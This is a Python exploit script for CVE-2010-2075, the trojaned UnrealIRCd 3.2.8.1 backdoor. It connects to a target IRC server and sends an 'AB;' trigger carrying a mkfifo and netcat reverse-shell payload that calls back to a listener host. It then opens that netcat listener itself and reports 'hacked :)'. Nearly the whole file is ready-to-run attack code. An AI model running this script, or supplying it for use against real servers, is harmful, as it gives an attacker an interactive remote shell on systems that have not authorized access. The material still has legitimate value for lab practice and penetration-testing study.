import argparse
import socket
import subprocess
import sys
from log_colors import *

# CVE-2010-2075
# UnrealIRCd 3.2.8.1, as distributed on certain 
# mirror sites from November 2009 
# through June 2010, contains an externally 
# introduced modification (Trojan Horse) 
# in the DEBUG3_DOLOG_SYSTEM macro, 
# which allows remote attackers to execute arbitrary commands. 
class CVE2010_2075:

    def __init__(self, rhost, rport, lhost, lport):
        print (LogColors.BLUE + "target: " + rhost + ":" + rport + "..." + LogColors.ENDC)
        self.rhost, self.rport = rhost, rport
        self.lhost, self.lport = lhost, lport
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect to the target
    def connect(self):
        print (LogColors.BLUE + "connecting to " + self.rhost + ":" + self.rport + "..." + LogColors.ENDC)
        try:
            self.sock.connect((self.rhost, int(self.rport)))
            print (LogColors.YELLOW + self.sock.recv(100).decode() + LogColors.ENDC)
        except Exception:
            print (LogColors.RED + "failed to connect " + self.rhost + ":" + self.rport + LogColors.ENDC)
            sys.exit()

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "sending payload..." + LogColors.ENDC)
        cmd = "AB; rm /tmp/f;mkfifo /tmp/f;"
        cmd += "cat /tmp/f|/bin/bash -i 2>&1"
        cmd += "|nc " + self.lhost
        cmd += " " + self.lport + " >/tmp/f\n"
        print (LogColors.YELLOW + cmd + LogColors.ENDC)
        cmd = cmd.encode()
        self.sock.send(cmd)
        self.sock.close()
        print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # open listener
    def listener(self):
        print (LogColors.BLUE + "opening listener..." + LogColors.ENDC)
        nc = "nc -nlvp " + self.lhost + " " + self.lport
        try:
            ncsh = subprocess.Popen(nc, shell = True)
            ncsh.poll()
            ncsh.wait()
            print (LogColors.YELLOW + nc + LogColors.ENDC)
        except:
            print(LogColors.RED + "exit shell" + LogColors.ENDC)

    # run exploit
    def run(self):
        self.connect()
        self.send_payload()
        self.listener()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-rh','--rhost', required = True, help = "target host")
    parser.add_argument('-rp','--rport', required = True, help = "target port")
    parser.add_argument('-lh','--lhost', required = True, help = "listener host")
    parser.add_argument('-lp','--lport', required = True, help = "listener port")
    args = vars(parser.parse_args())
    rhost, rport = args['rhost'], args['rport']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2010_2075(rhost, rport, lhost, lport)
    cve.run()

